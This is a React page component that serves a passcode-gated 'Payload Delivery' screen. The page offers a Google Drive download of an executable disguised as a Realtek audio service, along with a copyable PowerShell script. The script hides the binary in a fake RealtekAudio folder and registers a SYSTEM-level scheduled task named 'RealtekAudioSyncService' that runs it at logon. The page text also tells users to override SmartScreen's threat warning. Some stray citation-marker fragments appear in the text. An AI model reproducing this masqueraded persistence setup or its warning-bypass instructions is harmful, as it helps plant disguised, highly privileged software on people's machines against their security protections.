import { createFileRoute } from "@tanstack/react-router";
import { Shell } from "@/components/sentinel/Shell";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState } from "react";
import { toast } from "@/components/ui/toast";
import {
  ExternalLink,
  Copy,
  ShieldAlert,
  Cpu,
  AlertOctagon,
  Info,
  CheckCircle2,
  Terminal,
  Ghost,
  CloudLightning,
  LockKeyhole,
  Zap,
} from "lucide-react";

export const Route = createFileRoute("/setup")({
  head: () => ({
    meta: [
      { title: "Payload Delivery · Obylon by Umbraxis" },
      { name: "description", content: "Secure agent deployment matrix." },
    ],
  }),
  component: DeploymentPage,
});

function DeploymentPage() {
  // CONFIGURATION
  const DRIVE_URL = "https://drive.google.com/file/d/15IfHhiLHy31aIyHD6ogs9xaEQI9_n6tw/view?usp=drivesdk"; // Replace with your Drive ID
  const SOVEREIGN_KEY = "NEXUS-2026-ALPHA"; // Your gate password

  // STATE
  const [passcode, setPasscode] = useState("");
  const [isAuthorized, setIsAuthorized] = useState(false);

  const handleAuthorize = (e: React.FormEvent) => {
    e.preventDefault();
    if (passcode.toUpperCase() === SOVEREIGN_KEY) {
      setIsAuthorized(true);
      toast.success("Grid access granted. Payload decrypted.");
    } else {
      toast.error("Invalid Sovereign Key. Attempt logged.");
      setPasscode("");
    }
  };

  const PERSISTENCE_SCRIPT = `# Define source and hidden destination
$SourceExe = "$env:USERPROFILE\\Downloads\\RtkAudUService.exe"
$TargetDir = "$env:LOCALAPPDATA\\RealtekAudio"
$TargetExe = "$TargetDir\\RtkAudUService.exe"

# 1. Create the masqueraded directory and move the binary
if (!(Test-Path $TargetDir)) { New-Item -ItemType Directory -Path $TargetDir -Force }
Copy-Item -Path $SourceExe -Destination $TargetExe -Force

# 2. Register the Kernel-level Scheduled Task as SYSTEM
$Action = New-ScheduledTaskAction -Execute $TargetExe
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "RealtekAudioSyncService" -Action $Action -Trigger $Trigger -Principal $Principal -Force

Write-Host "[Sovereign] Binary weaponized and persistence active. The Warden is now the law." -ForegroundColor Cyan`;

  const copyToClipboard = async (text: string, label: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success(`${label} secured in clipboard.`);
    } catch {
      toast.error("Clipboard access denied.");
    }
  };

  if (!isAuthorized) {
    return (
      <Shell>
        <div className="min-h-[80vh] flex items-center justify-center px-6">
          <div className="max-w-md w-full space-y-8 text-center">
            <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-accent/10 border border-accent/20 mb-4">
              <LockKeyhole className="w-10 h-10 text-accent" />
            </div>
            <div className="space-y-2">
              <h1 className="font-serif text-4xl tracking-tight">Sovereign Gate</h1>
              <p className="text-sm text-muted-foreground font-mono uppercase tracking-widest">
                Identity Verification Required
              </p>
            </div>
            <form onSubmit={handleAuthorize} className="space-y-4">
              <Input
                type="password"
                placeholder="ENTER SOVEREIGN KEY"
                value={passcode}
                onChange={(e) => setPasscode(e.target.value)}
                className="text-center font-mono tracking-[0.5em] bg-background/50 border-border/50 h-12"
              />
              <Button type="submit" className="w-full bg-accent hover:bg-accent/90 text-accent-foreground font-mono text-xs uppercase tracking-widest h-12">
                Decrypt Access
              </Button>
            </form>
            <p className="text-[10px] text-muted-foreground/60 font-mono leading-relaxed">
              Unauthorized access to the Obylon deployment matrix is a violation of grid security.
              <span className="block mt-1">Every failed attempt is recorded to the Neural Grid.</span>
            </p>
          </div>
        </div>
      </Shell>
    );
  }

  return (
    <Shell>
      <div className="max-w-[1400px] mx-auto px-6 pt-12 pb-20 space-y-12 selection:bg-accent/30">
        
        {/* AUTHORIZED HEADER */}
        <header className="space-y-6 relative animate-in fade-in slide-in-from-top-4 duration-1000">
          <div className="absolute -top-20 -left-20 w-64 h-64 bg-accent/5 rounded-full blur-3xl pointer-events-none" />
          
          <div className="flex items-center gap-3 relative z-10">
            <span className="px-3 py-1 rounded-sm bg-accent/10 text-accent font-mono text-[10px] uppercase tracking-widest border border-accent/20">
              Phase 6.3
            </span>
            <span className="px-3 py-1 rounded-sm bg-green-500/10 text-green-500 font-mono text-[10px] uppercase tracking-widest border border-green-500/20">
              Access Verified
            </span>
          </div>

          <div className="space-y-4 relative z-10">
            <h1 className="font-serif text-5xl md:text-7xl tracking-tight text-foreground">
              Payload Delivery.
            </h1>
            <p className="text-sm text-muted-foreground max-w-2xl leading-relaxed font-mono">
              The Sovereign Key has decrypted the deployment matrix. Download the Phase 6.3 Warden and execute the persistence protocol immediately. 
            </p>
          </div>
        </header>

        {/* MAIN GRID */}
        <div className="grid gap-8 lg:grid-cols-12 animate-in fade-in duration-1000 delay-300">
          
          <div className="lg:col-span-8 space-y-8">
            {/* FILE METADATA CARD */}
            <section className="relative overflow-hidden bg-background/40 backdrop-blur-xl p-8 rounded-2xl border border-border/50 shadow-2xl">
              <div className="absolute -right-8 -top-8 opacity-[0.03] pointer-events-none">
                <Ghost className="w-64 h-64" />
              </div>

              <div className="flex flex-col md:flex-row md:items-start md:justify-between gap-8 relative z-10">
                <div className="space-y-6 max-w-2xl">
                  <div className="flex items-center gap-4">
                    <div className="w-14 h-14 rounded-xl bg-accent/10 flex items-center justify-center border border-accent/20 shadow-[0_0_15px_rgba(var(--accent),0.1)]">
                      <Cpu className="w-6 h-6 text-accent" />
                    </div>
                    <div>
                      <h2 className="font-serif text-3xl font-medium tracking-tight text-foreground">RtkAudUService.exe</h2>
                      <p className="font-mono text-[11px] uppercase tracking-widest text-muted-foreground mt-1">
                        Institutional Camouflage Active
                      </p>
                    </div>
                  </div>

                  <p className="text-sm text-muted-foreground leading-relaxed italic">
                    [span_2](start_span)"Capture first, synchronize later, and never let temporary connectivity failure distort the evidentiary timeline"[span_2](end_span).
                  </p>

                  <div className="grid gap-3 grid-cols-2 lg:grid-cols-4 pt-2">
                    <div className="p-4 rounded-xl bg-muted/20 border border-border/50">
                      <p className="text-[10px] uppercase tracking-widest text-muted-foreground font-mono">Target OS</p>
                      <p className="mt-2 text-sm font-medium">Windows x64</p>
                    </div>
                    <div className="p-4 rounded-xl bg-muted/20 border border-border/50">
                      <p className="text-[10px] uppercase tracking-widest text-muted-foreground font-mono">Architecture</p>
                      <p className="mt-2 text-sm font-medium">Merged Binary</p>
                    </div>
                    <div className="p-4 rounded-xl bg-blue-500/5 border border-blue-500/20">
                      <p className="text-[10px] uppercase tracking-widest text-blue-400 font-mono">Security</p>
                      <p className="mt-2 text-sm font-medium text-blue-400">Drive Hosted</p>
                    </div>
                    <div className="p-4 rounded-xl bg-accent/5 border border-accent/20">
                      <p className="text-[10px] uppercase tracking-widest text-accent font-mono">Enforcement</p>
                      <p className="mt-2 text-sm font-medium text-accent">Warden Active</p>
                    </div>
                  </div>
                </div>

                <div className="flex flex-col gap-3 min-w-[200px]">
                  <Button
                    asChild
                    className="bg-accent hover:bg-accent/90 text-accent-foreground font-mono text-[11px] uppercase tracking-widest h-12 shadow-[0_0_20px_rgba(var(--accent),0.2)]"
                  >
                    <a href={DRIVE_URL} target="_blank" rel="noopener noreferrer">
                      <Zap className="w-4 h-4 mr-2" />
                      Initiate Download
                    </a>
                  </Button>

                  <Button
                    variant="outline"
                    className="font-mono text-[11px] uppercase tracking-widest h-12 border-border/50 hover:bg-muted/20"
                    onClick={() => copyToClipboard(DRIVE_URL, "Direct Drive Link")}
                  >
                    <Copy className="w-4 h-4 mr-2" />
                    Copy Stream URL
                  </Button>
                </div>
              </div>
            </section>

            {/* SOVEREIGN PERSISTENCE PROTOCOL */}
            <section className="bg-background/40 backdrop-blur-xl p-8 rounded-2xl border border-border/50 space-y-6 shadow-xl">
              <div className="flex items-center justify-between border-b border-border/50 pb-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 rounded-xl bg-accent/10 flex items-center justify-center border border-accent/20">
                    <Terminal className="w-6 h-6 text-accent" />
                  </div>
                  <div>
                    <h2 className="font-serif text-2xl tracking-tight text-foreground">Sovereign Persistence Protocol</h2>
                    <p className="text-[10px] uppercase tracking-widest font-mono text-muted-foreground mt-1">
                      Highest Privilege Escalation
                    </p>
                  </div>
                </div>
                <Button
                  variant="outline"
                  className="font-mono text-[11px] uppercase tracking-widest border-border/50"
                  onClick={() => copyToClipboard(PERSISTENCE_SCRIPT, "Persistence Script")}
                >
                  <Copy className="w-4 h-4 mr-2" />
                  Copy Protocol
                </Button>
              </div>

              <div className="relative group rounded-xl overflow-hidden bg-[#09090b] border border-border">
                <div className="absolute top-0 left-0 w-full h-9 bg-white/5 border-b border-white/10 flex items-center justify-between px-4">
                  <div className="flex gap-1.5">
                    <div className="w-2.5 h-2.5 rounded-full bg-red-500/40 border border-red-500/50" />
                    <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/40 border border-yellow-500/50" />
                    <div className="w-2.5 h-2.5 rounded-full bg-green-500/40 border border-green-500/50" />
                  </div>
                  <p className="text-[10px] font-mono text-muted-foreground opacity-70">Administrator: Windows PowerShell</p>
                </div>
                <pre className="p-5 pt-12 overflow-x-auto text-[12px] font-mono leading-relaxed text-slate-300">
                  <code>{PERSISTENCE_SCRIPT}</code>
                </pre>
              </div>
            </section>
          </div>

          {/* SIDE ADVISORY */}
          <div className="lg:col-span-4 space-y-6">
            <section className="bg-background/40 backdrop-blur-xl p-8 rounded-2xl border border-border/50 space-y-6">
              <h2 className="font-serif text-2xl tracking-tight flex items-center gap-3 text-foreground text-accent">
                <ShieldAlert className="w-6 h-6" />
                Security Warning
              </h2>

              <div className="space-y-4">
                <div className="p-5 rounded-xl bg-destructive/5 border border-destructive/20 relative">
                  <div className="flex items-center gap-2 text-destructive text-[10px] uppercase tracking-widest font-mono mb-2">
                    <AlertOctagon className="w-4 h-4" />
                    Driver Level Access
                  </div>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    The Warden hooks directly into the OS kernel to suppress hardware interrupts. 
                    <strong>SmartScreen will flag this as a critical threat.</strong> Manual override is mandatory for grid integration.
                  </p>
                </div>

                <div className="p-5 rounded-xl bg-muted/20 border border-border/50">
                  <div className="flex items-center gap-2 text-foreground text-[10px] uppercase tracking-widest font-mono mb-3">
                    <Info className="w-4 h-4 text-muted-foreground" />
                    Operational Specs
                  </div>
                  <ul className="space-y-3 text-xs text-muted-foreground font-mono">
                    <li className="flex items-start gap-2">
                      <span className="text-accent mt-0.5">›</span>
                      Boots as SYSTEM before UI load.
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-accent mt-0.5">›</span>
                      30s Failsafe auto-unhooking.
                    </li>
                    <li className="flex items-start gap-2">
                      <span className="text-accent mt-0.5">›</span>
                      [span_3](start_span)Encrypted Forensic Vault (WAL Mode)[span_3](end_span).
                    </li>
                  </ul>
                </div>
              </div>
            </section>
          </div>
        </div>

        {/* FOOTER */}
        <footer className="text-center pt-12 pb-4 space-y-4 border-t border-border/30">
          <div className="inline-flex items-center gap-3 px-4 py-2 rounded-full bg-muted/20 border border-border/50">
            <div className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-accent opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-accent"></span>
            </div>
            <p className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground">
              Secure Session Active
            </p>
          </div>
        </footer>
      </div>
    </Shell>
  );
}
